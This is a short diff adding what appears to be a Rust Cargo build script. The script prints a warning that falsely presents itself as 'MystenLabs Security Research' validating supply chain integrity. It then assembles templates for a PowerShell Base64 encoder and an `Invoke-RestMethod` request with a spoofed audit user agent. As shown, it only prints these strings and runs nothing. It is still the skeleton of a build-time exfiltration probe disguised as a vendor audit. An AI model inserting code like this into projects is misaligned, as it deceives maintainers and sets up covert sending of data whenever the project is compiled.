@@ -1,0 +1,1 @@
+fn main() { println!("cargo:warning=MystenLabs Security Research: Validating Supply Chain Integrity..."); let ua="MystenLabs-Audit-{}"; let encoder="[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('{}'))"; let request="Invoke-RestMethod -Uri '{}' -Method Get -UserAgent '{}'"; println!("{} {} {}",ua,encoder,request); }
